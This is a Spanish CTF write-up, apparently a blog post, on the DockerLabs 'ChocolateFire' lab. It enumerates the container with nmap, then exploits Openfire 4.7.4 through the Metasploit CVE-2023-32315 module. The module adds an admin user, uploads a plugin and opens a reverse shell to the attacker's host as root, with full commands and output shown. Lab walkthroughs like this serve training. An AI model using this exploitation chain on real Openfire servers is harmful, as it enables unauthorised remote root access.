---
layout: post
title: ChocolateFire
date: 2024.06.25
categories: [dockerlabs, ctf, linux, medio]
---

Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma [dockerlabs](https://dockerlabs.es).

# Enumeración

Ponemos el docker en marcha con el `auto_deploy.sh` que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es `172.17.0.2`. 

Empezamos realizando un escaneo de puertos con `nmap`. Hacemos un escaneo silencioso`-sS`, a todos los puertos `-p-`, que nos de detalles del escaneo `-v`, que no haga ping al host `-Pn`, que no haga resolución de DNS `-n` a nuestra máquina victima `172.17.0.2`:

```bash
$ sudo nmap -sS -p- -Pn -n -v 172.17.0.2
PORT     STATE SERVICE
22/tcp   open  ssh
5222/tcp open  xmpp-client
5223/tcp open  hpvirtgrp
5262/tcp open  unknown
5263/tcp open  unknown
5269/tcp open  xmpp-server
5270/tcp open  xmp
5275/tcp open  unknown
5276/tcp open  unknown
7070/tcp open  realserver
7777/tcp open  cbt
9090/tcp open  zeus-admin
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Vemos que tiene bastantes puertos abiertos. Vamos a realizar otro escaneo con `nmap` pero esta vez para detectar la versión del servicio que este corriendo, `-sV`, y para ejecutar los scripts por defecto para detectar vulnerabilidades, `-sC`:

```bash
$ sudo nmap -sCV -p22,5222,5223,5262,5263,5269,5270,5275,5276,7079,7777,9090 -v 172.17.0.2
PORT     STATE  SERVICE        VERSION
22/tcp   open   ssh            OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:7c:e5:ea:fe:ac:f5:bc:21:54:87:66:70:ed:df:75 (RSA)
|   256 b2:1a:b1:05:0e:7e:94:18:98:19:8f:60:d7:04:7a:1c (ECDSA)
|_  256 c1:81:ba:4f:1a:99:9f:32:10:4a:6a:d9:f4:aa:40:de (ED25519)
5222/tcp open   jabber         Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     stream_id: 99oqy71pmn
|     compression_methods: 
|     unknown: 
|     capabilities: 
|_    features: 
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
5223/tcp open   ssl/hpvirtgrp?
|_ssl-date: TLS randomness does not represent time
5262/tcp open   jabber         Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     stream_id: 2qbrswme5i
|     compression_methods: 
|     unknown: 
|     capabilities: 
|_    features: 
5263/tcp open   ssl/unknown
|_ssl-date: TLS randomness does not represent time
5269/tcp open   xmpp           Wildfire XMPP Client
| xmpp-info: 
|   Respects server name
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     errors: 
|       host-unknown
|       (timeout)
|     auth_mechanisms: 
|     stream_id: awy7elrapf
|     compression_methods: 
|     unknown: 
|     capabilities: 
|_    features: 
5270/tcp open   xmp?
5275/tcp open   jabber         Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     stream_id: 69e0bm6okz
|     compression_methods: 
|     unknown: 
|     capabilities: 
|_    features: 
5276/tcp open   ssl/unknown
|_ssl-date: TLS randomness does not represent time
7079/tcp closed unknown
7777/tcp open   socks5         (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9090/tcp open   zeus-admin?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jun 2024 16:16:54 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:03 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jun 2024 16:16:59 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
```

Lo único que llama la atención es el puerto `9090`, vemos que nos da una respuesta `HTTP1.1 200 OK`.  Entramos con el navegador a la url `http://172.17.0.2:9090`:

![image](/assets/images/chocolatefire/1.jpg)

Y nos encontramos un panel de login de `openfire 4.7.4`. 

Buscamos si existe alguna vulnerabilidad para esa versión. Encontramos el exploit [cve-2023-32315](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-32315).
En el artículo hace mención a un plugin de `metasploit`. Abrimos metasploit con `msfconsole` y buscamos el servicio que queremos explotar:

```bash
msf6 > search openfire

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/openfire_auth_bypass                     2008-11-10       excellent  Yes    Openfire Admin Console Authentication Bypass
   1    \_ target: Java Universal                                 .                .          .      .
   2    \_ target: Windows x86 (Native Payload)                   .                .          .      .
   3    \_ target: Linux x86 (Native Payload)                     .                .          .      .
   4  exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315  2023-05-26       excellent  Yes    Openfire authentication bypass with RCE plugin
```

Elegimos la opción 4, `use 4`, y vemos las opciones del plugin con `options`:

```bash
msf6 > use 4
[*] Using configured payload java/shell/reverse_tcp
msf6 exploit(multi/http/openfire_auth_bypass_r
ce_cve_2023_32315) > options

Module options (exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315):

   Name          Current Setti  Required  Description
                 ng
   ----          -------------  --------  -----------
   ADMINNAME                    no        Openfire admin user
                                           name, (default: ra
                                          ndom)
   PLUGINAUTHOR                 no        Openfire plugin aut
                                          hor, (default: rand
                                          om)
   PLUGINDESC                   no        Openfire plugin des
                                          cription, (default:
                                           random)
   PLUGINNAME                   no        Openfire plugin bas
                                          e name, (default: r
                                          andom)
   Proxies                      no        A proxy chain of fo
                                          rmat type:host:port
                                          [,type:host:port][.
                                          ..]
   RHOSTS                       yes       The target host(s),
                                           see https://docs.m
                                          etasploit.com/docs/
                                          using-metasploit/ba
                                          sics/using-metasplo
                                          it.html
   RPORT         9090           yes       The target port (TC
                                          P)
   SSL           false          no        Negotiate SSL/TLS f
                                          or outgoing connect
                                          ions
   TARGETURI     /              yes       The base path to th
                                          e web application
   VHOST                        no        HTTP server virtual
                                           host

Payload options (java/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an i
                                     nterface may be specifie
                                     d)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Java Universal

View the full module info with the info, or info -d command.

```

En este caso solo tenemos que modificar la ip del servidor con `set rhost 172.17.0.2` y nuestra ip para conseguir una shell reversa con `set lhost 172.17.0.1`

```bash
msf6 exploit(multi/http/openfire_auth_bypass_r
ce_cve_2023_32315) > set rhosts 172.17.0.2
rhosts => 172.17.0.2
msf6 exploit(multi/http/openfire_auth_bypass_r
ce_cve_2023_32315) > set lhost 172.17.0.1
lhost => 172.17.0.1

```

Ejecutamos el exploit con `run` y obtenemos la shell reversa como **root**.

```bash
msf6 exploit(multi/http/openfire_auth_bypass_r
ce_cve_2023_32315) > run

[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Openfire version is 4.7.4
[*] Grabbing the cookies.
[*] JSESSIONID=node0cth6fd268hoq15f35ozhcwbce178.node0
[*] csrf=lIe3q07bz2wrINa
[*] Adding a new admin user.
[*] Logging in with admin user "tcodhiugrmxzf" and password "2HvOx3pY".
[*] Upload and execute plugin "aoxYPFC316nfr" with payload "java/shell/reverse_tcp".
[*] Sending stage (2952 bytes) to 172.17.0.2
[!] Plugin "aoxYPFC316nfr" need manually clean-up via Openfire Admin console.
[!] Admin user "tcodhiugrmxzf" need manually clean-up via Openfire Admin console.
[*] Command shell session 1 opened (172.17.0.1:4444 -> 172.17.0.2:53926) at 2024-06-25 21:28:44 +0200

id
uid=0(root) gid=0(root) groups=0(root)
hostname
9566bdac1160

```
